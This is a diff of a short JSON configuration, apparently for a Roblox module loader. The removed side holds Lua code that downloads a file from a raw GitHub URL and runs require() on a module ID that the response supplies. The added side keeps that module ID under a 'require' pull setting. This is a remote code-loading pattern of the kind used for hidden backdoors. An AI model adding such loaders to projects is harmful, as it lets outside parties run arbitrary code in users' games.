@@ -1,8 +1,9 @@
 {
-  "record": {
-    "success": true,
-    "message": "Success!",
-    "data": "112590432374147",
-    "customLinkerCode": "local HttpService = game:GetService(\"HttpService\")\n\nlocal function boot()\n    local success, response = pcall(function()\n        return HttpService:GetAsync(\"https://raw.githubusercontent.com/kxglkidd-blip/didactic-disco/refs/heads/main/%E6%96%B0%E5%BB%BA%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3%20(4).txt\")\n    end)\n\n    if success then\n        local data = HttpService:JSONDecode(response)\n        if data and data.success then\n            return require(tonumber(data.data))\n        end\n    end\n\n    return nil\nend\n\nreturn boot()"
+  "success": true,
+  "moduleId": 112590432374147,
+  "method": "boot",
+  "pull": {
+    "enabled": true,
+    "type": "require"
   }
 }
